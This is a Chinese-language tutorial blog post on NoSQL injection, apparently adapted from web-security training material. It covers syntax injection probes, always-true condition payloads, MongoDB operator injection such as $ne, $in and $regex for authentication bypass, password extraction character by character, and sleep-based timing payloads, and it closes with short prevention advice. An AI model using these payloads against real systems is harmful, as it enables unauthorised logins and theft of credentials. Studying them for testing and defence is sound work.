---
title: NoSQL 注入
img: 'https://bigworldxld.github.io/picx-images-hosting/images/Nosql.webp'
categories: test
tags:
  - nosql
abbrlink: 10113
date: 2024-11-29 23:36:17
---

## NoSQL 注入

常见的 NoSQL 数据库类型包括：

- 文档存储 - 这些数据存储在灵活的半结构化文档中。它们通常使用格式，例如 JSON、BSON 和 XML，并以 API 或查询语言进行查询。示例包括 MongoDB 和 Couchbase。
- 键值存储 - 这些存储以键值格式存储数据。每个数据字段都与一个唯一的键字符串相关联。 根据唯一键检索值。示例包括 Redis 和 Amazon DynamoDB。
- 宽列存储 - 这些存储将相关数据组织到灵活的列系列中，而不是传统的行中。例子 包括 Apache Cassandra 和 Apache HBase。
- 图形数据库 - 这些数据库使用节点来存储数据实体，使用边缘来存储实体之间的关系。例子 包括 Neo4j 和 Amazon Neptune

NoSQL 数据库以传统 SQL 关系表以外的格式存储和检索数据。它们使用各种查询语言，而不是像 SQL 这样的通用标准，并且具有较少的关系约束。

## 注入的类型

两种不同类型的 NoSQL 注入

- 语法注入 - 当您可以打破 NoSQL 查询语法，使您能够注入自己的 有效载荷。该方法类似于 SQL 注入中使用的方法。但是，攻击的性质各不相同 重要的是，因为 NoSQL 数据库使用一系列查询语言、查询语法类型和不同的数据结构。
- 运算符注入 - 当您可以使用 NoSQL 查询运算符来操作查询时，会发生这种情况

### 确定要处理的字符

要确定应用程序将哪些字符解释为语法，您可以注入单个字符。例如，您可以提交 ，这将产生以下MongoDB查询：`'`

```txt
this.category == '''
```

如果这导致与原始响应发生更改，则可能表示该字符已破坏查询语法并导致语法错误。您可以通过在输入中提交有效的查询字符串来确认这一点，例如，通过转义引号：`'`

```txt
this.category == '\''
```

如果这不会导致语法错误，则可能意味着应用程序容易受到注入攻击

### 确认条件行为

检测到漏洞后，下一步是确定是否可以使用 NoSQL 语法影响布尔条件。

要对此进行测试，请发送两个请求，一个具有 false 条件，另一个具有 true 条件。例如，您可以使用条件语句，如下所示：`' && 0 && 'x``' && 1 && 'x`

```txt
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x``https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

如果应用程序的行为不同，则表明 false 条件会影响查询逻辑，但 true 条件不会影响。这表明注入这种语法样式会影响服务器端查询。

### 覆盖现有条件

现在，您已经确定可以影响布尔条件，您可以尝试覆盖现有条件以利用此漏洞。例如，您可以注入一个计算结果始终为 true 的 JavaScript 条件，例如：`'||'1'=='1`

```txt
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

这将生成以下 MongoDB 查询：

```txt
this.category == 'fizzy'||'1'=='1'
```

由于注入的条件始终为 true，因此修改后的查询将返回所有项目。这使您能够查看任何类别中的所有产品，包括隐藏或未知类别。

## NoSQL 运算符注入

NoSQL 数据库通常使用查询运算符，这些运算符提供了指定数据必须满足的条件才能包含在查询结果中的方法。MongoDB 查询运算符的示例包括：

- `$where`- 匹配满足 JavaScript 表达式的文档。
- `$ne`- 匹配所有不等于指定值的值。
- `$in`- 匹配数组中指定的所有值。
- `$regex`- 选择值与指定正则表达式匹配的文档。

### 提交查询运算符

在 JSON 消息中，您可以将查询运算符作为嵌套对象插入。例如，变为 `{"username":"wiener"}``{"username":{"$ne":"invalid"}}`

对于基于 URL 的输入，您可以通过 URL 参数插入查询运算符。

1. 将请求方法 从`GET` 转换为 `POST`
2. 将标头 .`Content-Type`更改为`application/json`
3. 将 JSON 添加到消息正文中。
4. 在 JSON 中注入查询运算符。

### 在 MongoDB 中检测运算符注入

要测试 username 输入是否处理查询运算符，您可以尝试以下注入：

```txt
{"username":{"$ne":"invalid"},"password":"peter"}
```

如果 username 和 password 输入都处理运算符，则可以使用以下有效负载绕过身份验证：

```txt
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

要以账户为目标，您可以构建一个包含已知用户名或您猜到的用户名的有效负载。例如：

```txt
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

使用 JavaScript 函数来提取信息。例如，以下有效负载使您能够识别密码是否包含数字：`match()`

```txt
admin' && this.password.match(/\d/) || 'a'=='b
```

如果对此请求的响应与您在提交错误密码时收到的响应不同，则表明该应用程序可能容易受到攻击。您可以使用该运算符逐个字符提取数据。例如，以下有效负载检查密码是否以 ：`$regex``a`

```txt
{"username":"admin","password":{"$regex":"^a*"}}
```

### 基于时序的 NoSQL 注入

1. 多次加载页面以确定基准加载时间。
2. 将基于 timing 的 payload 插入 input 中。基于时序的有效负载在以下情况下会导致响应有意延迟 执行。例如，在成功进样时导致 5000 毫秒的有意延迟。`{"$where": "sleep(5000)"}`
3. 确定响应的加载速度是否较慢。这表示注射成功。

admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'

## 防止 NoSQL 注入

- 使用接受字符的允许列表清理和验证用户输入。
- 使用参数化查询插入用户输入，而不是将用户输入直接连接到查询中。
- 要防止 Operator 注入，请应用接受密钥的允许列表